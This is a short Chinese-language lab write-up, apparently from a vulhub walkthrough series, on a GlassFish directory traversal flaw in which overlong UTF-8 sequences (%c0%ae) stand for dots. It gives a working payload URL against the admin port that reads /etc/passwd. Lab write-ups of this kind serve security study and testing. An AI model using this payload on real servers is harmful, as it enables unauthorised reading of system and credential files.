# GlassFish 任意文件读取漏洞

###### by ADummy

### 0x00利用路线

​			直接url执行payload

### 0x01漏洞介绍

​			java语言中会把`%c0%ae`解析为`\uC0AE`，最后转义为ASCCII字符的`.`（点）。利用`%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/`来向上跳转，达到目录穿越、任意文件读取的效果。。

### 0x02漏洞复现

环境运行后，访问`http://your-ip:8080`和`http://your-ip:4848`即可查看web页面。其中，8080端口是网站内容，4848端口是GlassFish管理中心。

访问`https://your-ip:4848/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd`，发现已成功读取`/etc/passwd`内容：

#### payload：

```
`https://your-ip:4848/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd`
```

![GlassFish_任意文件读取漏洞_1](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/GlassFish_任意文件读取漏洞_1.jpg)







